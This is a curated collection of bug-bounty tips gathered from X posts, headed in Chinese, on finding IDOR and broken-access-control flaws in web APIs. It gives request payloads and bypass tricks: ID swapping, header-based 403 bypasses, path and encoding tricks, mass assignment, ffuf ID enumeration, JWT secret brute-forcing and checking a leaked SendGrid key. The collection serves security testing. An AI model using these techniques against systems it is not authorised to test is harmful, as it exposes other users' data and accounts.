# X 语料 · IDOR 越权（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。
同一帖被多号转贴者只留一份；纯战绩、纯提问、正文缺失者已剔除。
JSON 载荷中的弯引号已统一为直引号（原文为排版符号，非载荷意图）。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[越权与对象引用](../by-type/idor-access-control.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-idor（84 条） · 本文 265 行

- Testing for BOLA (IDOR)?
  Even if the ID is GUID or non-numeric, try to send a numeric value.
  For example: "/?user_id=111" instead of "user_id=inon@traceable.ai"
  Sometimes the AuthZ mechanism supports both and it's easier to brute force numbers.
- Looking for BOLA (IDOR) in APIs? got 401/403 errors?
  AuthZ bypass tricks:
  * Wrap ID with an array {"id":111} --> {"id":[111]}
  * JSON wrap {"id":111} --> {"id":{"id":111}}
  * Send ID twice URL?id=<LEGIT>&id=<VICTIM>
  * Send wildcard {"user_id":"*"}
- Privilege Escalation:
  1. Created 2 accounts, with user and admin privileges.
  2. Performed sensitive action and intercepted the request from Admin account.
  3. Replayed the same request using Burp repeater with User privileges account.
  4. Privilege escalation on the user account
- Authorization Bypasses:
  - Check for basic IDORs(id=1,2,3...)
  - If URL/abc/3 blocked, try URL/abc/3/edit or so (try valid or fake)
  - if URL/logs -> not working, try URL/logs.json
  - Try add "admin=true" or so while registering (depending on target)
- Easy way to find IDOR vulns:
  1. Find the ID of account A.
  2. Create a new account B and login.
  3. In Burp make a rule that replaces ID B with ID A in request URL and body.
  4. Use the application as normal until you see information from account A.
- How to find authentication bypass vulnerabilities
  GET /delete?user=test HTTP/1.1  -->  HTTP/1.1 401 Unauthorized
  GET /delete?user=test HTTP/1.1
  X-Custom-IP-Authorization: 127.0.0.1  -->  HTTP/1.1 302 Found
- 1. Role based app w Rest APIs
  2. Tried accessing High Priv user functions w Sub user tokens on all endpoints - *401/403 Denied*
  3. Changed endpoints from:
  "/profile/changexyz" -->
  "/profile/changexyz/"
  4. 200 OK - Privilege Escalation on all endpoints (PUT/POST)
- Access control vuln with blocked access can be bypassed by adding the X-Original-URL header in the request.
  POST /admin/deletecustomer HTTP/1.1 -> 403
  POST / HTTP/1.1
  X-Original-URL: /admin/deletecustomer -> 200OK
- Interesting IDOR:
  My target allows to delete user of an organization
  DELETE <ORG_ID>/users/<USER_ID>
  So as an attacker tried:
  DELETE <VICTIM_ORG_ID>/users/<VICTIM_USER_ID> --> 403
  DELETE <ATTACKER_ORG_ID>/users/<VICTIM_USER_ID> --> 200 OK
- Looking for high impact IDOR?
  Always try to find the hidden parameters for this endpoints using Arjun and Parameth
  /settings/profile
  /user/profile
  /user/settings
  /account/settings
  /username
  /profile
  And any payment endpoint
- POST /api/objects/ > Create Object
  Tried:
  DELETE /api/objects/objectID/ > (No Luck)
  PATCH /api/objects/objectID/ > (IDOR)
- Bug: Idor on password reset
  1. Go to change password page enter pass and hit burp
  2. You will see that id in encrypted format try to identify the hash
  3. Change it to another user id and hit request because there is no old password u will be logged in
- After getting 401 on all endpoints of /review_link, i.e GET /v2/review_links/ID/Endpoints. I analyze the main JS file and came across to new endpoint /assets which lead me to an IDOR i.e GET /v2/review_links/ID/assets ----> 200 OK
- IDOR(ATO) + PII
  1. Login > Add new user
  2. Click on "edit" invited user > capture request in burp
  3. Replace invited users ID with any other users ID
  4. Update email > send
  5. Email updated(ATO) for other user + PII disclosure in response
- Improper access Control can be P1 Critical
  Bypass 403 /wp-admin adding in your wordlists /wp-admin/setup-config.php?step=1
  It allows an attacker can create a new database.
- Improper access control can be High P2, this allow an attacker to read sensitive information, choosing the format you want. Ex: (xml, txt, json...)
  Add in wordlist: /wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=xml
- If you have an API endpoint giving 403 (but it might have sensitive information)
  e.g. /api/v4/user/messages/4044654
  Try to replace user agent with :-
  User-Agent: okhttp/4.1.1
  sometimes developers may forgot to add authorization for android requests.
- You could pipe lists into ffuf instead of just specifying a file. For example, if you wanted to test a bunch of id numbers against an endpoint (think IDOR) then you could do
  seq 1 - 1000 | ffuf -w - -u https://targetdomain.com/user/FUZZ
- Access Control Bypass -
  1. User doesn't have permission to edit anything which is created by the admin.
  2. Response has a field xx_update_xx=false, change it to true.
  3. Now you can edit anything and save it.
- Improper access control edge case.
  /admin/index.jsp --> 403
  /;/admin/index.jsp --> 200
- Where I usually find IDOR (BOLA) in apps, is in features that allow extracting data as files.
  * "download_report/org_id=11"
  * "my_activity_as_pdf?user_id=22"
  These are often developed by different teams that don't fully understand the Authz mechanism
- Simplest IDOR :
  -> cat domain.txt | grep "id=[\d]*" | tee findings.txt
- Bug: IDOR
  1. As Admin & User create a chat with chat-bot respectively
  2. Now, as User capture request to view own chats
  3. Change User UUID to Admin UUID
  *[UUID is revealed via profile image]
  4. Admin chats got disclosed
- 1. Scope ur target in burp.
  2. login to target, Copy all urls in http history.
  3. Save urls and logout from target.
  4. Run aquatone, We may end up with Broken access control.
- Bug: Broken access control
  1. Admin add User-A
  2. User-A capture request on adding files
  3. Admin remove User-A
  4. User-A can edit the file details from captured request & add new files forever
- Found an IDOR where one could simply pass email after /api/UserProfile/<email> which disclosed PII of the user. One endpoint disclosed the email of all users on the site, giving access to every user's PII.
- Privilege Escalation Tip
  http://site.com/users/ -> unauthorized
  http://site.com/reports/ -> " "
  http://site.com/settings/ -> " "
  http://api.site.com/users/ -> 200
  http://api.site.com/reports/ -> 200
  http://api.site.com/settings/ -> 200
- IDOR in Profile Picture
  1) Upload a picture and intercept the request.
  2) Now in the request we have parentuid as the parameter.
  3) Try to replace this value with different user.
  4) We can escalate this feature by mass assigning parentuid param.
- 1. collect subdomains
  2. found open s3 bucket with only listing permission
  3. read js file in the bucket and found Authorization key for https://statuspage.io
  4. read the docs and access over 4000 internal emails/phone numbers of the company's employees
- An API is calling your own records like this?
  -> GET /v1/transactions/all
  See if the response contains an object with an ID and reference it directly
  -> GET /v1/transactions/813
  If you get a 200 OK, check if you can access any record ID for an IDOR!
- Privilege Escalation Via Forced Browsing:-
  1. Created 2 users one normal and one admin.
  2. Visited every endpoint on admin user with burp running in background.
  3. Then logged in as normal user and visited same endpoints.
- IDOR w/ UUID:
  1. If you see a UUID, swap it w/ a UUID from another test account.
  2. Find an endpoint that returns a UUID based on other input like email.
  3. Use that UUID in the request from step 1. If it works, IDOR
- Blind IDOR
  1. Change userID
  2. Get 200 status code, but no info leak
  3. Check email, SMS, and export files
  4. Email notification leaks PII
  https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489
- Weird IDOR I've never seen before:
  1. User 1 updates at /api/account
  2. User 2 registers at /api/register
  3. Change userID for /api/register from User 2 -> User 1
  IDOR succeeds - User 2 changes account details of User 1 via registration endpoint
- Bypassing Object Level Authorization:
  GET /api_v1/messages --> 401
  vs
  GET /api_v1/messages?user_id=victim_uuid --> 200
- Test IDOR Vulnerability that leads to all User Data Leakage
  1. Change the /me Endpoint to /user.
  2. Change the GET Method to POST.
  3. Add Content-Type: application/json header.
  4. Add this Payload to the HTTP Request Body.
  Payload: {"ids":["1"]}
- SendGrid key starts with: SG.xxxxxxxxxxxx
  curl -X "GET" "http://api.sendgrid.com/v3/scopes" -H "Authorization: Bearer SENDGRID_TOKEN-HERE" -H "Content-Type: application/json"
  You can find it in mobile apps & js files
- Privilege Escalation
  1. Owner invite attacker to the org
  2. Attacker save the request when they still in the org
  3. Owner kick the attacker
  4. Attacker send the request that they saved before
- i was recently able to bypass access controls by appending a url-encoded hash sign, resulting in an idor w/ pii disclosure
  /api/v2/user/123 —> 403
  /api/v2/user/123%23 —> 200
  it may be worth appending %00-%ff to see if the logic or regex in use can be terminated
- a simple IDOR
  GET /api/v1/user/detail?type=1&user_id=123   (denied)
  GET /api/v1/user/detail?type=0&user_id=123   (200)
  always try changing the value if u find parameters similar to that (type, role, scene, etc.)
- IDOR - P1
  Attackers able to fetch order details of any user.
  * Captured a request like this in Burpsuite: /xyz?reservation_id=GUID
  Difficult to guess other users reservation GUID.
  * Manipulated like this: /xyz?order_id=<6 digit ID>
- IDOR to delete other user files -> Delete /api/v1/files/file_id:123
  Response shows HTTP/2 500 Internal Server Error
  But the file was successfully deleted
  Always look at the impact not the response
- 1. `/createuncommittedpurchaseorder` has an IDOR, but it's a 32-character UUID.
  2. Complete the purchasing process and there's another IDOR, which is used to retrieve this long UUID.
  https://hashimamin.medium.com/hacking-e-commerce-for-idor-and-more-29cee84cd30e
- Check for Weak JWT Secrets
  python3 jwt_tool.py -t <jwt_token> -C -d /usr/share/wordlists/rockyou.txt
  Use jwt_tool to brute-force weak signing secrets — can result in privilege escalation.
- Broken Access Control (BAC) Checker
  curl -b "session=valid_user" https://target.com/api/user/123
  curl -b "session=valid_user" https://target.com/api/user/124
  If it ain't forbidden, then it's a bug.
- Bypass 403 Forbidden Using Headers
  curl -H "X-Original-URL: /admin" https://domain.com
  Try headers like X-Rewrite-URL, X-Custom-IP-Authorization, X-Original-URL — many legacy apps allow access
- When a single ID fails, a pair might pass. IDOR bypasses can be that simple
  - Victim's ID: 5200
  - Attacker's ID: 5233
  GET /api/users/5200/info -> Access Denied
  GET /api/users/5200,5233/info -> Bypassed
- Broken Access Control allows to see All User details.
  - GET /_core_/workspaces/716/users (Returns Only Own User details)
  - GET /_core_/workspaces/716/users?return_all_user=true (Returns All User details)
- IDOR in URL path.
  PUT /my_day/jobs/4 HTTP/2 = 403
  PUT /my_day/jobs/4.json HTTP/2 = 200 OK
  I knew that .json works on a GET endpoint. But today I randomly tried on PUT. It worked!
- I was able to delete anyone's Bookings.
  Original Req:
  DELETE /api/bookings?bookings=3777104
  Response:
  Invalid Bookings = > 400 Bad
  Modified req:
  DELETE /api/bookings?bookings[]=3777104
  Response:
  200 OK
- Critical Admin Dashboard Access vuln via Mass Assignment in /api/user -> role field
  Privilege Escalation to Admin
  Full Dashboard Access
- An interesting Privilege Escalation Story
  Admin Action only
  GET /PrintDocument/PrintStatement/1001 => 200 OK
  I tried this same API call from a Non-admin user
  Response status was different 302 Found, but the response body was the same
- Critical IDOR via API versioning
  POST /api/v2.0/jobs/ => 403
  POST /api/v1.0/jobs/ => Bypassed
  API versioning is fun to find. After finding it, always retest 2/3 times.
- Found an IDOR that leads to 0-click account takeover.
  The endpoint api/users/ returned basic info.
  But accessing api/users/<anything> exposed sensitive fields, including forgot_passwd_token, which can be used to reset any user's password and eventually the email
- IDOR leads to email verification bypass
  1. sign up with any email
  2. from another account hit the endpoint api/users/<user_name> -> shows some info includes the email verification token
  3. use https://tar_get.com/email_verification/<TOKEN> to verify
- IDOR vulnerability allows unauthorized access to team members
  /api/v1/workspace/<uuid victim> 404 Not found
  /api/v1/workspace/<uuid victim>/member 200 ok
- Found an IDOR in the chat AI system:
  Normal: /chats/7b9fa258-b4d8-40e4-8560-9f7d4b82ee46/messages -> 403 Forbidden
  Change one letter to UPPERCASE: /chats/7B9fa258-b4d8-40e4-8560-9f7d4b82ee46/messages -> 200 OK + full chat history of another user!
- IDOR = unauthorized access to objects.
  In room->template (POST /api/rooms/room_templates), no check on room_id.
  Steps: intercept -> swap room_id -> send -> template created with victim data
  -> cross-org private data exposure
- API Hunting Tip
  Found: /api/v3/
  Also enumerate:
  /api/v1/
  /api/v2/
  /api/beta/
  /api/internal/
  Older versions often implement different authorization or validation logic.
